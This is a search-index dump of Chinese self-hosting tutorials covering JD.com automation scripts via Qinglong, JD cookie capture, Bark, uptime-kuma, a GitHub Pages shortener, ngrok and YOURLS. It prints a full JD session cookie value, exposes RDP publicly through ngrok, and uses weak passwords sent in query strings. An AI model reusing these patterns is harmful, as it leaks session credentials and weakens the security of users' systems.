https://github.com/passerby-b/JDDJ.git \"jddj_\" \"scf_test_event|jddj_fruit_code.js|jddj_getck.js|jd_|jddj_cookie\" 8 1-23/4 * * * zcy01仓库 ql repo https://github.com/ZCY01/daily_scripts.git \"jd_\" 9 1-23/4 * * * shufflewzc 仓库 ql repo https://github.com/shufflewzc/faker2.git \"jd_|jx_|getJDCookie\" \"activity|backUp|Coupon|update\" \"^jd[^_]|USER\" 10 1-23/4 * * * he1pu互助仓库 ql repo https://github.com/he1pu/JDHelp.git \"jd_|jx_|getJDCookie\" \"activity|backUp|Coupon|update\" \"^jd[^_]|USER\" 11 1-23/4 * * * curtinlv仓库 ql repo https://github.com/curtinlv/JD-Script.git 13 1-23/4 * * * cdle仓库 ql repo https://github.com/cdle/jd_study.git \"jd_\" 14 1-23/4 * * * 青龙相关仓库集锦： https://github.com/Oreomeow/VIP/tree/main/Tasks/qlrepo 本人就测试第一个地址 运行就会执行，就会在任务栏中有很多任务，刷新页面。 利用谷歌浏览器获取京东Cookie抓取教程，添加变量\">https://g.xgss.net/doc/internet/jd_cookie.html，cookie值千万不能泄露，如图，环境变量--->添加变量 再看任务的日志是否执行成功。 某个任务成功，看手机app上的一些豆子获取的记录。 其他功能 钉钉登录通知 钉钉群里获取token值。 配置： 系统设置---> 通知设置，配置token，保存。 钉钉通知： Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-28 15:53:54 "},"doc/internet/jd_cookie.html":{"url":"doc/internet/jd_cookie.html","title":"利用谷歌浏览器获取京东Cookie抓取","keywords":"","body":"利用谷歌浏览器获取京东Cookie抓取 使用到的工具 Chrome浏览器 操作过程 打开Chrome浏览器，按F12打开开发者工具，打开工具中左上角的图标(下图) 然后随便选中一个手机设备(下图) 地址栏输入 https://wqs.jd.com/ 回车(下图) 打开京东网站后 点击右上角 登录 (下图) 输入登录账号密码 点击登录(下图) 部分人可能需要拖动滑动验证码(下图) 登录完后 按按钮清除记录，在地址栏输入”https://home.m.jd.com/” ,回车 (下图) 找到第一个封包”home.m.jd.com”，点击选中(下图) Cookie所在位置，看下图 备注 : 我们所需要的cookie字段在”cookie:”的里面 但是我们提交cookie的时候 不能全部复制上去 我们只需要提交pt_key开头的和pt_pin开头的 一般这两个是在一起出现的 例如我的cookie就是 pt_key=AAJhDPHpADD4slF11wQeWjW22zJqWYMw7lIU-CDqJHCykFdIZfNS_rGRbAsj-VfLdk9iL6RjB74;pt_pin=39874641-7; 提交的时候 一定要把最后的分号也带上 pt_key的前面不能有空格 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/internet/助力居家办公，免费领取语雀 VIP 会员 1-3 年.html":{"url":"doc/internet/助力居家办公，免费领取语雀 VIP 会员 1-3 年.html","title":"助力居家办公，免费领取语雀 VIP 会员 1-3 年","keywords":"","body":"【限时活动】助力居家办公，免费领取语雀 VIP 会员 1-3 年 语雀限时活动 目前语雀推出了免费领取会员活动，新老用户都能领到 1~3 年的会员 原价 99 元/年，方法教程如下。 1.需要先下载安装语雀手机端APP https://www.yuque.com/download，注册帐号并登录； 2.打开语雀 App ，进入「我」→「活动福利」→「输入邀请码」； 这里填入一个邀请码，比如我的：NO2Y3E，之后双方都能获得 3 个月会员； 你可以将自己的邀请码分享给别人，最多可得到 36 个月，加上分享得 36 月，最多可得 3年3个月 什么是语雀 语雀是一款免费的在线笔记和知识库管理软件。它刚诞生时，最初只是希望给工程师们提供一个好用的 Markdown 文档编写工具，但在产品研发过程中，发现其实身边的每个人、每个团队都有很多知识、经验、笔记和文档的积累，但却缺乏一个好用的工具来整理、沉淀、记录、分享和交流，于是便有了今天的语雀。 语雀会员 语雀是可以完全免费使用的！轻度用户其实免费版完全足够，免费用户和付费的「语雀会员」主要区别在资源上传流量、知识库个数、协作人数、单文件上传大小、支持更多上传格式等。 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/Open-Source-Software/":{"url":"doc/Open-Source-Software/","title":"开源软件","keywords":"","body":"开源软件 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/Open-Source-Software/免费开源iPhone推送消息工具+服务端-Bark.html":{"url":"doc/Open-Source-Software/免费开源iPhone推送消息工具+服务端-Bark.html","title":"免费开源iPhone推送消息工具+服务端-Bark","keywords":"","body":"免费开源iPhone推送消息工具+服务端-Bark 什么是Bark Bark 是一款纯推送提醒服务，主要用来给自己的 iPhone 发送自定义内容的推送，可以是文字、链接，不提供历史记录功能，阅后即焚。服务端和客户端均开源，实时性和稳定性都非常可靠，支持自定义请求，自行部署服务器，push 走 iOS 官方渠道，适合注重隐私的用户。 Bark客户端： https://github.com/Finb/Bark Bark服务端：https://github.com/Finb/bark-server Bark苹果App Store： https://apps.apple.com/cn/app/bark-customed-notifications/id1403753865 谷歌浏览器插件： https://chrome.google.com/webstore/detail/bark/pmlkbdbpglkgbgopghdcmohdcmladeii 功能简介 1.可以将消息推送到iPhone上。 2.可以使用谷歌浏览器发送消息到iPhone上。 3.可以自建服务器，通过https，把消息发送到iPhone上。 4.配合你的应用程序，python、java，shell等 ，只需要一个地址https://api.day.app/{你的密钥}/{推送的内容} 就可以收到指定消息。 基本演示 1.在谷歌Chrome浏览器发送消息 首先要安装谷歌浏览器插件，选择要复制的文字，右键发送“send to device myiphone” 2.手机收到消息 还有人根据客户端开发了 Chrome 插件，能帮你方便地把网页上的文本、网址、剪贴板内容推送到 Bark 手机端，使用起来也比较方便。 安装 Bark 应用之后，会得到一个示例页面，可以直接拿来就用，只需要在浏览器中打开链接，修改后面的推送内容就行了。 Bark服务端部署文档 如果你有自己的云服务器和域名，可以部署web站点，再配合ssl证书搭建https服务，数据传输更加安全。 隐私保护: 如果你的数据特别敏感，请将Bark部署到私人服务器。 所有的数据将只在 你的手机、你的服务器、Apple推送服务器之间传输。 历史消息通过 NotificationServiceExtension 扩展，在收到推送时将推送信息保存在本地，不会经过其他任何设备。 历史记录仅由个人iCloud私有库进行同步。 可以确保你产生的任何通知，将只留在你的设备与你的iCloud中 Docker部署 docker run -itd --name bark \\ --restart always \\ -p 8080:8080 \\ -v /data/docker/bark-data:/data \\ finab/bark-server 官方部署文档。https://day.app/2018/06/bark-server-document/ Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/Open-Source-Software/如何给公司节约成本，搭建免费开源监控系统uptime-kuma.html":{"url":"doc/Open-Source-Software/如何给公司节约成本，搭建免费开源监控系统uptime-kuma.html","title":"搭建免费开源监控系统uptime-kuma","keywords":"","body":"如何给公司节约成本，搭建免费开源监控系统uptime-kuma 由于业务需要，我司的产品越来越多，api接口监控相对比较薄弱，对此要搭建HTTP(s)的监控系统，之前一直使用第三方的监控系统，比如阿里云的云监控。 基本流程 1.了解需求。 2.通过各种途径了解有没有相关免费解决方案 3.本地搭建实施，评估上线。 4.上线部署 使用。 本文记录希望找到开源监控系统走的弯路，apimonitor和apitestplatform都有这样或者那样的问题。最终找到对应的开源监控uptime-kuma，并且有以外惊喜，如果有其他的需求也可以按照此流程进行。 业务需求 1.开源、免费 2.定时监控生产环境的接口链接，如果出现访问非200的、超时，则报警。 3.告警方式： 邮件、短信、钉钉群通知、电话等 4.支持本地Linux服务器部署 5.类似阿里云的“云监控”--站点监控，如图。第三方参考解决方案https://www.jiankongbao.com/ 测试系统 服务器系统： Centos7 IP地址： 192.168.1.5 服务器已安装： nginx和docker 开源产品 在网上搜索、问同事和相关从业经验的人，是否有相关的监控产品。 一、系统监控产品apimonitor（项目已关闭） apimonitor有api探测、api监控、http请求模拟、系统接口监控等功能，可以模拟http页面操作过程，并根据请求耗时和响应结果监控系统接口可用性和正确性。 开源地址： https://gitee.com/ecar_team/apimonitor 查看功能部分符合，但是需要二次开发，可以在此开源项目上开发 1.新增告警功能，通过邮件、短信、钉钉群通知等。 2.新增访问时长记录。 二、apitestplatform（亲测有bug） 一个web界面的接口自动化测试平台 git地址：https://github.com/342164796/apitestplatform 安装步骤 cd /data git clone https://github.com/342164796/apitestplatform cd apitestplatform/ 首次部署需要在settings.py文件里修改mysql的地址和账户名密码为自己的数据库地址 vi apitestplatform/settings.py 'default': { 'ENGINE': 'django.db.backends.mysql', 'HOST': \"*.*.*.*\", 'NAME': \"apitestplatform\", 'USER': \"user\", 'PASSWORD': \"password\", 'PORT': \"3306\", # 'CHARSET': 'utf8', # 'COLLATION': 'utf8_general_ci', } 2.初始化数据库，执行如下命令： python3.6 manage.py makemigrations python3.6 manage.py migrate python3.6 manage.py runserver 安装的踩坑记录 1.SyntaxError: invalid syntax # python manage.py runserver File \"manage.py\", line 14 ) from exc ^ SyntaxError: invalid syntax python 版本太低，系统自带为2.7 升级安装 python3.6 # python -V Python 2.7.5 # python3.6 -V Python 3.6.8 2.Couldn't import Djang 没有安装django # python3.6 manage.py runserver Couldn't import Django. Are you sure it's installed and available on your PYTHONPATH environment variable? Did you forget to activate a virtual environment? 安装 Django 虚拟环境里用python3安django和uwsgi （如果用于生产的话，则需要指定安装和你项目相同的版本） pip3.6 install django pip3.6 install uwsgi 3.没有安装pymysql 再次报错： # python3.6 manage.py runserver ModuleNotFoundError: No module named 'pymysql' 解决： # pip3.6 install pymysql 再次报错： # python3.6 manage.py runserver ModuleNotFoundError: No module named 'django_crontab' 4.没有安装django-crontab 报错 django.db.utils.OperationalError: (2003, \"Can't connect to MySQL server on '*.*.*.*' ([Errno -2] Name or service not known)\") 解决： # pip3.6 install django-crontab 启动成功 # python3.6 manage.py runserver You have 29 unapplied migration(s). Your project may not work properly until you apply the migrations for app(s): admin, auth, base, contenttypes, sessions. Run 'python manage.py migrate' to apply them. March 02, 2022 - 10:31:01 Django version 3.2.12, using settings 'apitestplatform.settings' Starting development server at http://127.0.0.1:8000/ Quit the server with CONTROL-C. 启动成功 # python3.6 manage.py runserver Django version 3.2.12, using settings 'apitestplatform.settings' Starting development server at http://127.0.0.1:8000/ Quit the server with CONTROL-C. nginx反向代理 server { listen 80; server_name apitest.test.me; #root /data/wwwroot/web/apitest.test.me/; access_log /data/wwwroot/log/apitest.test.me-access.log main_aliyun; error_log off; location / { proxy_pass http://127.0.0.1:8000; proxy_redirect off; proxy_set_header Host $host; proxy_set_header X-Real-IP $remote_addr; proxy_set_header X-Forwarded-For $proxy_add_x_forwarded_for; } } 绑定hosts访问 192.168.1.5 apitest.test.me 添加项目报错： 由于不太清楚报错的原因。放弃此开源项目。 三、开源监控uptime-kuma 继续百度搜索查找，在知乎的页面中找到一个@无为无谓 的回答，页面https://www.zhihu.com/question/23755976 他推荐了一个开源产品，uptime-kuma。 uptime-kuma地址：https://github.com/louislam/uptime-kuma 反向代理教程： https://github.com/louislam/uptime-kuma/wiki/Reverse-Proxy 演示网站: https://demo.uptime.kuma.pet:27000/ 创建管理员账号，有10分钟的体验时间。 查看演示基本能满足需要，在本地搭建测试，功能都符合我的要求，居然还有惊喜，首先界面很精美，再次除了有基本的HTTP(S)的监控的，还有TCP端口监控、PING监控、HTTP（s）关键字监控、DNS监控、Push监控、Steam Game Server监控，功能相当多，重点是都是免费的，只要有服务器，或者局域网的虚拟机（可访问外网）就可以监控你的各种服务。 docker部署uptime-kuma 本次使用docker安装如果，需要非docker参考开源文档。 # mkdir -p /data/docker/uptime-kuma/data # docker run -d --restart=always -p 3001:3001 -v /data/docker/uptime-kuma/data:/app/data --name uptime-kuma louislam/uptime-kuma:1 # netstat -tunpl|grep 3001 tcp6 0 0 :::3001 :::* LISTEN 29542/docker-proxy- 访问： http://192.168.1.5:3001 访问，创建管理员账号。 nginx代理访问 server { listen 80; server_name uptime.test.me; location / { proxy_pass http://localhost:3001; proxy_http_version 1.1; proxy_set_header Upgrade $http_upgrade; proxy_set_header Connection \"upgrade\"; proxy_set_header Host $host; } } 绑定hosts访问 192.168.1.5 uptime.test.me 基本设置 设置里面功能还比较齐全，有外观设置，消息通知重点是消息通知有，邮件、钉钉、短信、飞书等等的第三方通知，相当齐全。 外观设置 通知设置 创建监控项 HTTPS监控图 端口TCP检测 关闭nginx，80端口： systemctl stop nginx 报错： 重置密码 Docker环境 docker exec -it npm run reset-password 非Docker环境 # cd 项目目录 # npm run reset-password https://github.com/louislam/uptime-kuma/wiki/Reset-Password-via-CLI 配置消息通知 Uptime Kuma提供多种的消息推送，详情请参考：https://github.com/louislam/uptime-kuma/issues/284 我这里需要Bark手机APP、配置邮件、钉钉群通知的演示，还有阿里云短信也是比较方便快捷的提醒。 配置Bark Brak是苹果系统的一款推送软件。ios手机安装app，APP内可以获取推送地址： https://api.day.app/{密钥}/这里改成你自己的推送内容 https://api.day.app/{密钥}/这里改成你自己的推送内容 后面不能有中文，有测试测试会报错 点击“测试一下”收到消息 模拟测试 恢复测试： 钉钉群通知 了解更多：https://developers.dingtalk.com/document/robots/custom-robot-access 钉钉群获取WebHookUrl：假设为https://oapi.dingtalk.com/robot/send?access_token=abc123456 WebHookUrl:填写完整的地址、SecretKey则填写abc123456的值，我开始填写了错了，测试很久没有通过。 配置邮箱 如图配置，主机名、端口号、密码不是163的登录密码，需要在163邮箱后台开通开启IMAP/SMTP服务。获取授权密码。 测试发送邮件： 禁用身份验证 这是可选的，如果不禁用游客访问需要用户名和密码，但是你关掉后，就可以自由访问了。（后台后上角的设置，然后拉到最下面即可看到！） 设置Status Page 这个功能还是很重要的，可以把新建的监控服务放置到这个监控页面，这样就可以随时随地的看到每个系统的状态了。 点击右上角的Status Page，开始编辑，具体看图： 首页默认就会是这样的状态页。 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/Open-Source-Software/免费开源Github Page实现短链接方案.html":{"url":"doc/Open-Source-Software/免费开源Github Page实现短链接方案.html","title":"免费开源Github Page实现短链接方案","keywords":"","body":"免费开源Github Page实现短链接方案 以前公司有一个需求，将推广用的长链接转化为短链接，再通过营销短信发送给客户。虽然有很多的第三方短链的生成工具，但为了安全还是自建一个。以前用过开源的YOURLS，是基于PHP的开源方案。 https://github.com/YOURLS/YOURLS 。 今天在网上发现一个更加简单的方案就是，gh-pages-url-shortener，一款完全使用 GitHub Pages 就可搭建的最小型的短链接生成服务。 开源地址： https://github.com/nelsontky/gh-pages-url-shortener Github开源的短链接：https://nlsn.cf/1 不需要自己有服务器，通过自有域名解析到Github Page，在指定的issue上添加目标地址即可实现，链接跳转。 搭建准备 有个自有域名，例如星哥的 d.xggs.net。 github账号：笔者的funet8 安装步骤 Fork仓库 打开https://nlsn.cf/1页面，点击fork，将原来的仓库拷贝到自己的账号下。 获取到仓库：https://github.com/{你的用户名}/gh-pages-url-shortener， 我的仓库是 https://github.com/funet8/gh-pages-url-shortener 配置GitHub Pages github pages 可以做什么? github pages 可以放一些纯静态的网站,比如你的项目介绍等.当然,也可以使用一些静态博客工具在本地通过markdown写博客,生成静态页面后发布到github pages 新建仓库存放当做数据库 GitHub 上新建一个仓库，当做数据库用来存储链接，笔者这里命名为 gh-pages-url-shortener-db，得到 https://github.com/funet8/gh-pages-url-shortener-db 修改仓库配置 修改CNAME 把fork的仓库https://github.com/funet8/gh-pages-url-shortener克隆到本地，修改文件之后提交到github。 如果你有自己的私有域名，可以设置对应的 CNAME（这跟其他 GitHub Pages 设置一样） CNAME文件里的改成私有域名 d.xgss.net 修改404.html的接口地址 修改仓库中的404.html，将GITHUB_ISSUES_LINK改成自己的地址， 地址根据实际情况填写。 var GITHUB_ISSUES_LINK = \"https://api.github.com/repos/funet8/gh-pages-url-shortener-db/issues/\"; 域名解析 我的域名是在阿里云上购买的，将域名CNAME解析到 d.xgss.net 解析到 funet8.github.io 访问： http://d.xgss.net/ 再在 https://github.com/funet8/gh-pages-url-shortener-db/issues 提交一个issue，在里面就会有一个id号 访问 http://d.xgss.net/1 即可跳转到你提交的地址上，以后就可以在github仓库中的issues的标题添加目标地址，就可以实现短链接跳转了。 安全性 由于目标地址是存储在issues上，避免有好事者乱提交issuse用，github issues 怎么禁止其他人提交，则将我的 gh-pages-url-shortener-db的issues设置为私有。 设置为私有，就所有的url的地址都是404了，只能手动定时清理，避免出现麻烦。 没有自有域名 如果没有自有域名，可以用github的域名实验，但这个就是长了： {github账号名}.github.io/{仓库名} 笔者的地址： http://funet8.github.io/gh-pages-url-shortener/1 总结 nlsn.cf/1应该链接到这个 repo。 要添加新的短链接，请将标题作为您要缩短的链接（包括http(s)://）的问题添加到 https://github.com/nelsontky/gh-pages-url-shortener-db/issues。 新创建的短网址可以通过以下方式访问nlsn.cf/{issue_number} Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-28 15:46:50 "},"doc/Open-Source-Software/云服务器搭建自己的ngrok服务-实现内网穿透.html":{"url":"doc/Open-Source-Software/云服务器搭建自己的ngrok服务-实现内网穿透.html","title":"云服务器搭建自己的ngrok服务实现内网穿透","keywords":"","body":"云服务器搭建自己的ngrok服务-实现内网穿透 本文介绍ngrok是什么以及如何通过开源ngrok自建服务搭建，实现内网穿透。 自建ngork的优点和缺点 优点：限制少，可玩性高，安全性高，完全可以删除花生壳、向日葵、TeamViewer等软件了。 缺点：有一定的技术门槛、需要购买云服务器和域名，如果服务器在国内域名需要备案。 如果不自建内网如果没有限制可以做用现成的技术，地址：http://www.ngrok.cc/ 还有 https://www.ngrok.com 等，注册账号即可。 ngrok的应用场景 满足没有公网IP环境下，远程访问各种局域网应用或设备， 星锅用的最多就是 1.把家里的NAS通过ngrok共享到公网，让我无论在家还是在外面都能实现文件无缝衔接。 2.远程办公： 通过ngrok把公司的办公电脑3389远程连接的端口暴露到公网，再通过远程桌面到办公电脑上（内网的Linux服务器也可以）。 3.在家的PC上做了一个小站点，想让异地的朋友看时，可以将这个站点暴露给他访问（比如我在做本地开发微信时）。 如企业内网的OA/ERP/CRM系统、NAS私有云、视频监控、FTP/MAC/SVN服务器、个人局域网搭建的网站、博客、进行开发调试等，均可使用ngrok内网穿透。 什么是内网穿透 内网穿透，也即 NAT 穿透，进行 NAT 穿透是为了使具有某一个特定源 IP 地址和源端口号的数据包不被 NAT 设备屏蔽而正确路由到内网主机。下面就相互通信的主机在网络中与 NAT 设备的相对位置介绍内网穿透方法。 总结一句话就是本地运行的项目（没有公网IP的项目），如果不使用内网穿透，只能本机访问。用到了内网穿透，就会给一个公网的ip代替本地ip,这样别人就可以访问到你的本地项目啦。 什么叫ngrok？ ngrok 是一个反向代理，通过在公共的端点和本地运行的 Web 服务器之间建立一个安全的通道。ngrok 可捕获和分析所有通道上的流量，便于后期分析和重放。 开源地址：https://github.com/inconshreveable/ngrok.git 和其类似的功能还有开源的frp： https://github.com/fatedier/frp 自建ngrok准备 1.域名 2.服务器（服务器如果在国内需要备案），推荐使用轻量云服务器。 阿里云服务器优惠 http://d.xgss.net/2 | 腾讯云服务器优惠 http://d.xgss.net/3 3.云服务器Linux(centos7)、Nginx、DockerDocker镜像，备案域名 域名解析 选择二级域名域名 ngrok.xgss.net 三级域名使用泛解析 *.ngrok.xgss.net，为了后面指定域名比如 nas.ngrok.xgss.net就不用再解析了 ngrok.xgss.net A解析到 云服务器公网IP *.ngrok.xgss.net A解析到 云服务器公网IP 安装Ngrok服务端 通过远程ssh连接服务器。 下载常用依赖库 yum -y install zlib-devel openssl-devel perl hg cpio expat-devel gettext-devel curl curl-devel perl-ExtUtils-MakeMaker hg wget gcc gcc-c++ 安装go和git yum -y install go git 要注意git版本必须大于1.7.9,go版本必须大于1.4,否则可能有意想不到的错误 开始安装ngrok 个人习惯安装到 /data/ 目录下 如果你想安装到其他目录 则进入你想安装的目录 mkdir /data/ cd /data/ git clone https://github.com/inconshreveable/ngrok.git ngrok #进入ngrok目录,后面操作都是在ngrok目录下完成! cd /data/ngrok #生成并替换源码里默认的证书，注意域名要修改为你自己的，这里是一个虚拟的测试域名 NGROK_DOMAIN=\"ngrok.xgss.net\" #测试一下有没有设置成功 echo $NGROK_DOMAIN #输出ngrok.xgss.net表示成功 openssl genrsa -out rootCA.key 2048 openssl req -x509 -new -nodes -key rootCA.key -subj \"/CN=$NGROK_DOMAIN\" -days 5000 -out rootCA.pem openssl genrsa -out device.key 2048 openssl req -new -key device.key -subj \"/CN=$NGROK_DOMAIN\" -out device.csr openssl x509 -req -in device.csr -CA rootCA.pem -CAkey rootCA.key -CAcreateserial -out device.crt -days 5000 之后会在 ngrok 目录下生成 root,device 等六个文件。 然后需要拷贝到配置的目录中，在编译的时候会使用这些文件。 cp -r rootCA.pem assets/client/tls/ngrokroot.crt cp -r device.crt assets/server/tls/snakeoil.crt cp -r device.key assets/server/tls/snakeoil.key 到这个地方，证书生成已经复制的准备工作就已经完成了。 生成服务器的ngrokd make release-server 这样就会在bin目录下生成ngrokd 这个文件,就是我们ngrok的服务器程序 编译客户端ngrok(不同系统不同的命令如下) 32位linux客户端: GOOS=linux GOARCH=386 make release-client 64位linux客户端: GOOS=linux GOARCH=amd64 make release-client 32位windows客户端: GOOS=windows GOARCH=386 make release-client 64位windows客户端: GOOS=windows GOARCH=amd64 make release-client 32位mac平台客户端:GOOS=darwin GOARCH=386 make release-client 64位mac平台客户端:GOOS=darwin GOARCH=amd64 make release-client ARM平台linux客户端: GOOS=linux GOARCH=arm make release-client 我这里是64位linux和64位windows客户端编译 GOOS=linux GOARCH=amd64 make release-client GOOS=windows GOARCH=amd64 make release-client 依次执行这2个命令之后就会在bin目录里面生成所有的客户端文件，客户端平台是文件夹的名字，客户端放在对应的目录下，当前Linux平台客户端就直接在bin目录下一个ngrok的程序 配置启动服务器 httpAddr 是访问普通的http使用的端口号，用后面用 子域名.ngrok.xgss.net 来访问服务 httpsAddr 是访问的https使用的端口号,同上，只不过是需要https的服务访问才用这个端口(一般用不上) tunnelAddr 是ngrok通道的端口号，这个端口是Ngrok用来通信的，所以这个端口在服务器上和客户端上设置必须要对应才可以正常的链接，默认端口是4443 完整命令: bin/ngrokd -domain=\"$NGROK_DOMAIN\" -httpAddr=\":80\" -httpsAddr=\":443\" -tunnelAddr=\":4443\" 我使用的 bin/ngrokd -domain=\"$NGROK_DOMAIN\" -httpAddr=\":80\" nohup /data/ngrok/bin/ngrokd -domain=\"ngrok.xgss.net\" -httpAddr=\":8000\" -httpsAddr=\":443\" -tunnelAddr=\":4443\" & 不输出 nohup.out nohup /data/ngrok/bin/ngrokd -domain=\"ngrok.xgss.net\" -httpAddr=\":8000\" -httpsAddr=\":443\" -tunnelAddr=\":4443\" >/dev/null 2>&1 & 查看端口情况 netstat -tunpl |grep ngrokd tcp 0 0 0.0.0.0:8000 0.0.0.0:* LISTEN 28558/ngrokd tcp 0 0 0.0.0.0:4443 0.0.0.0:* LISTEN 28558/ngrokd tcp 0 0 0.0.0.0:443 0.0.0.0:* LISTEN 28558/ngrokd 其中NGROK_DOMAIN对应的就是一开始设置过的域名地址。 要注意我这里使用的是8000端口。 安装ngrok客户端 下载客户端 ls /data/ngrok/bin darwin_386 darwin_amd64 go-bindata linux_386 linux_arm ngrok ngrokd windows_386 windows_amd64 其中 /data/ngrok/bin/ngrok 是linux的客户端 其中 windows_amd64 是windows的客户端 linux客户端配置 下载客户端：文件 /data/ngrok/bin/ngrok 在192.168.1.6客户端上操作： 新建配置文件： mkdir /data/ngrok vi /data/ngrok/ngrok_8000.cfg 填写一下内容 server_addr: \"ngrok.xgss.net:4443\" trust_host_root_certs: false vi /data/ngrok/ngrok_8082.cfg 填写一下内容 server_addr: \"ngrok.xgss.net:4443\" trust_host_root_certs: false 将在服务器中生成的ngrok文件上传目录中/data/ngrok/ chmod +x /data/ngrok/ngrok nohup /data/ngrok/ngrok -log=/data/ngrok/ngrok_8000.log -subdomain=seafiles -config=\"/data/ngrok/ngrok_8000.cfg\" 8000 & nohup /data/ngrok/ngrok -log=/data/ngrok/ngrok_8082.log -subdomain=down -config=\"/data/ngrok/ngrok_8082.cfg\" 8082 & netstat -tunpl |grep ngrok tcp 0 0 127.0.0.1:4040 0.0.0.0:* LISTEN 20609/ngrok 日志： -log=/data/ngrok/ngrok_8000.log 是记录ngrok的日志，如果前期调试的时候加上这个参数，如果不能访问就可以查看到底是什么问题 子域名： -subdomain=seafiles 是定义访问的时候的子域名，现在访问 seafiles.ngrok.xgss.net 就可以访问到这一台机器上8000端口的服务 ngrok Tunnel Status online Version 1.7/1.7 Forwarding https://test.ngrok.xgss.net -> 127.0.0.1:80 Forwarding http://test.ngrok.xgss.net -> 127.0.0.1:80 Web Interface 127.0.0.1:4040 Conn 0 Avg Conn Time 0.00ms 到这里不出意外的话就会启动成功了,访问test.ngrok.xgss.net的时候就是你本地的ip了.你可以通过apache或nginx配置test.ngrok.xgss.net域名指定你的目录开始使用。 windows客户端配置 在D盘新建一个目录 ngrok，如图有四个文件功能分别是 add.bat是将start.bat添加到开机启动项，ngrok.cfg是端口的配置，ngrok.exe是服务端下载的文件，start.bat启动ngrok add.bat内容 reg add HKEY_LOCAL_MACHINE\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /v lin /t REG_SZ /d D:\\ngrok\\start.bat /f ngrok.cfg的内容 server_addr: \"ngrok.xgss.net:4443\" trust_host_root_certs: false tunnels: mstsc: remote_port: 3378 proto: tcp: \"127.0.0.1:3389\" start.bat的内容 D: cd D:\\ngrok ngrok -config=ngrok.cfg start mstsc 双击start.bat 测试用手机4G网络远程连接本机 地址： ngrok.xgss.net:3378 可以远程连接即可。 Copyright © g.xgss.net all right reserved，powered by Gitbook修订时间： 2022-04-27 11:08:47 "},"doc/Open-Source-Software/云服务器部署开源短链生成-YOURLS.html":{"url":"doc/Open-Source-Software/云服务器部署开源短链生成-YOURLS.html","title":"云服务器部署开源短链生成-YOURLS","keywords":"","body":"简单部署开源短链工具-YOURLS YOURLS是一款使用PHP+Mysql开发的短链接程序，相比公共短网址好处是数据掌握在自己手中，可控性更高。开源地址：https://github.com/YOURLS/YOURLS 前期准备 window系统推荐phpStudy等集成PHP环境 linux系统：LNMP（Linux+Nginx+Mysql+PHP）环境 域名，如果服务器在国内，则需要备案，笔者使用二级域名，http://y.xgss.net 示例 http://y.xgss.net/aliyun | http://y.xgss.net/tx 部署 YOURLS 的安装流程类似于PHP站点。 将安装包解压并上传至服务器； 将 user/config-sample.php 重命名为 user/config.php； 编辑 user/config.php 文件，填入数据库信息和配置站点选项； 访问 http://yoursite.com/admin/ 开始使用吧！ 下载YOURLS YOURLS免费开源，可以在Github下载最新版本（https://github.com/YOURLS/YOURLS/releases），解压后放到站点根目录，并将config-sample.php更名为config.php。 wget https://github.com/YOURLS/YOURLS/archive/refs/tags/1.8.2.tar.gz 配置MySQL数据库 需要先新建一个MySQL数据库，并设置好账号、密码，然后修改user/config.php配置文件，填写正确的MySQL信息，配置信息如下。 修改数据库配置 修改 user/config.php //配置数据库 define( 'YOURLS_DB_USER', 'your db user name' ); define( 'YOURLS_DB_PASS', 'your db password' ); define( 'YOURLS_DB_NAME', 'yourls' ); define( 'YOURLS_DB_HOST', 'localhost' ); define( 'YOURLS_DB_PREFIX', 'yourls_' ); //设置你的域名 define( 'YOURLS_SITE', 'http://y.xgss.net' ); //设置用户名和密码 $yourls_user_passwords = [ 'admin' => '123456', // 设置好密码 ]; 输入管理员账号密码登录后如果出现“Could not auto-encrypt passwords. Error was: “cannot write file”.”报错，请将user/config.php文件的权限改为666，然后刷新网页，再把权限改回644，因为你刚才填写密码时用的是明文，这样很危险，所以程序需要对其加密。 配置nginx反向代理 server { listen 80; server_name y.xgss.net; root /data/wwwroot/web/y.xgss.net/; access_log /data/wwwroot/log/y.xgss.net-access.log main_aliyun; error_log /dev/null; location / { index index.php try_files $uri $uri/ /yourls-loader.php } location ~ ^/.+\\.php { fastcgi_index index.php; fastcgi_split_path_info ^(.+\\.php)(.*)$; fastcgi_param SCRIPT_FILENAME $request_filename; fastcgi_param PATH_INFO $fastcgi_path_info; fastcgi_param PATH_TRANSLATED $document_root$fastcgi_path_info; include fastcgi_params; fastcgi_pass 127.0.0.1:9000; } } 重启nginx 安装：http://y.xgss.net/admin/install.php 登录：http://y.xgss.net/admin/ 添加短链接 yourls汉化 汉化包的git地址为https://github.com/guox/yourls-zh_CN，下载中文包然后解压后放在放在user/languages/目录下 YOURLS默认是中文界面，不方便操作，看到有网友提供了汉化，访问yourls-zh_CN下载汉化包，并解压至user/languages目录，然后修改user/config.php #语言包放到languages [root@aliyun-hz languages]# ll total 68 -rw-r--r-- 1 www www 210 Apr 23 2017 index.html -rw-r--r-- 1 www www 51 Mar 24 2013 README.md -rw-r--r-- 1 www www 22123 Mar 24 2013 zh_CN.mo -rw-r--r-- 1 www www 32783 Mar 24 2013 zh_CN.po #修改配置文件启用中文 vi user/config.php #启用中文 define( 'YOURLS_LANG', 'zh_CN' ); YOURLS- API 请求地址：http://域名//yourls-api.php 参数：username(用户名)、password（密码）、format（格式 json）、url（长地址）、action（功能，shorturl） 1、GET请求，构建下get请求，可以直接访问也可以用python构建请求 http://y.xgss.net/yourls-api.php?username=user&password=password&url=http://www.baidu.com&format=json&action=shorturl python构建get请求 import requests, json url = \"http://10.0.0.101/yourls-api.php?\" data = {\"username\":\"wangxiaoyu\",\"password\":\"123456\",\"url\":\"http://www.baidu.com\",\"format\":\"json\",\"action\":\"shorturl\"} response = requests.get(url, data) print(json.loads(response.text)) 访问返回的http://10.0.0.101/q94n1k这个短链接可以跳转到百度 返回信息为 { 'url': { 'keyword': 'q94o0a', 'url': 'http://www.baidu.com', 'title': '百度一下，你就知道', 'date': '2020-04-21 07:40:58', 'ip': '10.0.0.1' }, 'status': 'success', 'message': 'http://www.baidu.com 已保存为', 'title': '百度一下，你就知道', 'shorturl': 'http://10.0.0.101/q94o0a', 'statusCode': 200 } 